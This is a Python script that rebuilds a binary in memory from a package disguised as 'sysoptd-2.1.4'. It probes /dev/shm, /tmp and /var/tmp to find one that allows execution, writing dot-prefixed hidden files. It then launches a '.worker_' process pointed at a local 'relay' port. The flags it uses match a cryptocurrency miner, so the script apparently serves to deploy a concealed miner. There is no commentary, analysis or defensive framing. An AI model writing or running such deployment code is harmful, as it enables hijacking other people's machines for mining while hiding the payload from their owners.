import sys, os, tempfile, stat, subprocess, socket, time
sys.path.insert(0, '/tmp/sysoptd-2.1.4/lib')
from loader import assemble_to_memfd

# Assemble binary
fd = assemble_to_memfd('/tmp/sysoptd-2.1.4/data')
size = os.lseek(fd, 0, os.SEEK_END)
os.lseek(fd, 0, os.SEEK_SET)
data = os.read(fd, size)
os.close(fd)

# Test each tmp dir
for tmp_dir in ['/dev/shm', '/tmp', '/var/tmp']:
    if not os.path.isdir(tmp_dir):
        print(f"[!] {tmp_dir} does not exist")
        continue
    try:
        tmp = tempfile.NamedTemporaryFile(delete=False, prefix='.test_', dir=tmp_dir)
        tmp.write(data)
        tmp.close()
        os.chmod(tmp.name, 0o700)
        print(f"[*] wrote to {tmp.name}")
        # Try executing
        r = subprocess.run([tmp.name, '--help'], capture_output=True, timeout=5)
        print(f"[*] exec from {tmp_dir}: code={r.returncode} err={r.stderr[:100]}")
        os.unlink(tmp.name)
        if r.returncode == 0:
            print(f"[+] {tmp_dir} WORKS for execution!")
            break
    except Exception as e:
        print(f"[!] {tmp_dir} failed: {e}")

# Test relay connection
print("\n[*] Testing relay connection...")
port = 17387
try:
    s = socket.create_connection(("127.0.0.1", port), timeout=2)
    s.close()
    print(f"[+] relay port {port} is open")
except Exception as e:
    print(f"[!] relay port {port} not open: {e}")

# Test actual launch with relay
print("\n[*] Testing full launch...")
try:
    tmp = tempfile.NamedTemporaryFile(delete=False, prefix='.worker_', dir='/tmp')
    tmp.write(data)
    tmp.close()
    os.chmod(tmp.name, 0o700)
    
    proc = subprocess.Popen(
        [tmp.name, '-o', f'127.0.0.1:{port}', '-u', 'test', '-p', 'x', '-k', '--print-time=10', '-t', '1'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    time.sleep(3)
    if proc.poll() is not None:
        out = proc.stdout.read().decode('utf-8', errors='replace')
        print(f"[!] worker exited immediately code={proc.returncode}")
        print(f"[!] output: {out[:500]}")
    else:
        print(f"[+] worker running! pid={proc.pid}")
        out = b''
        import select
        r, _, _ = select.select([proc.stdout], [], [], 2)
        if r:
            out = proc.stdout.read(1000)
        print(f"[*] output: {out.decode('utf-8', errors='replace')[:300]}")
        proc.terminate()
    os.unlink(tmp.name)
except Exception as e:
    print(f"[!] launch failed: {e}")
